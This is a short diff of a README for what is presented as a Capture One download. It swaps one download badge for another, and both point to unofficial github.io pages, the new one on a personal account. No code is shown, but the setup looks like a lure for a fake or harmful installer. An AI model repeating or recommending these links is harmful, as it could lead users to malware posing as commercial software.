@@ -4,10 +4,8 @@
   <img src="https://teamworkphoto.com/wp-content/uploads/2023/11/CAPTURE-ONE_PRIMARY-LOGO-STACKED-BLACK.png" alt="Capture One Logo"/>
 </div>
 
-<div align="center">
+[![GET Capture One](https://img.shields.io/badge/GET%20%E2%80%94%20Capture-One-0078D6?style=for-the-badge&logoColor=white)](https://helenlewisr375.github.io/.github/Capture-One)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://capture-one-raw-editor.github.io/.github/)
-</div>
 
 ---
 
